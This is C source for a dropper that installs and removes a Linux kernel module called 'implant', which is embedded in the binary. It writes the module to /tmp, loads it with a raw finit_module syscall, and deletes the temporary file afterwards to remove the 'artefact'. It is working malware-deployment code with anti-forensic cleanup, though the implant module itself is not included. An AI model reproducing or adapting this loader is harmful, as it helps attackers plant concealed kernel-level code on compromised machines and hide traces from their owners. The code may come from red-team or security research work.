#include <debug.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>

/* The implant is embedded in this binary.
 * These symbols are exposed. */
extern char _binary_implant_ko_start[];
extern char _binary_implant_ko_end[];

#ifndef MODNAME
#define MODNAME "implant"
#endif /* MODNAME */

#ifndef TMP_PATH
#define TMP_PATH "/tmp/implant.ko"
#endif /* TMP_PATH */

void usage(char *prog_name)
{
	printf(
			"usage: %s <COMMAND>\n"
			"List of main commands:\n"
			"install   \tInstall the implant to the system\n"
			"uninstall \tUninstall the implant from the system\n",
			prog_name);
}

int install(void)
{
	int status = 0;

	int fd = open(TMP_PATH, O_CREAT | O_EXCL | O_WRONLY, 0700);
	if (fd < 0) {
		IMLOG_DEBUG("Failed to open %s", TMP_PATH);
		return fd;
	}

	ssize_t nbytes_required = _binary_implant_ko_end - _binary_implant_ko_start;
	ssize_t nbytes = write(fd, _binary_implant_ko_start, nbytes_required);

	close(fd);
	if (nbytes < nbytes_required) {
		IMLOG_DEBUG("Failed to write the required bytes");
		status = -1;
		goto f;
	}

	/* Load the kernel module.
	 * GLIBC does not provide wrapper functions around the system call.
	 *
	 * The kernel module must be open with O_RDONLY. */
	fd = open(TMP_PATH, O_RDONLY);
	if (fd < 0) {
		IMLOG_DEBUG("Failed to open %s after it has been created", TMP_PATH);
		status = -1;
		goto f;
	}

	int ret = syscall(__NR_finit_module, fd, "", 0);

	close(fd);
	if (ret) {
		IMLOG_DEBUG("Failed to load kernel module");
		if (errno == EPERM) {
			fprintf(stderr, "The program must be run with root privileges.\n");
		}

		status = -1;
		goto f;
	}

f:
	/* Remove artefact. */
	remove(TMP_PATH);
	IMLOG_TRACE("Removed artefact from %s", TMP_PATH);
	return status;
}

int uninstall(void)
{
	int ret = syscall(__NR_delete_module, MODNAME, 0);

	if (ret) {
		IMLOG_DEBUG("Failed to unload the kernel module");
	}

	if (ret && errno == EPERM) {
		fprintf(stderr, "The program must be run with root privileges.\n");
	}

	return ret;
}

int dispatch(char **args)
{
	const char *command = *args;

	int ret;
	if (strcmp("install", command) == 0) {
		ret = install();
	} else if (strcmp("uninstall", command) == 0) {
		ret = uninstall();
	} else {
		ret = -1;
	}

	return ret;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		IMLOG_DEBUG("The required number of arguments were not provided");
		goto f;
	}

	int ret = dispatch(&argv[1]);
	if (ret) {
		IMLOG_DEBUG("Failed to dispatch and handle the command");
		goto f;
	}

	return EXIT_SUCCESS;

f:
	usage(*argv);
	return EXIT_FAILURE;
}
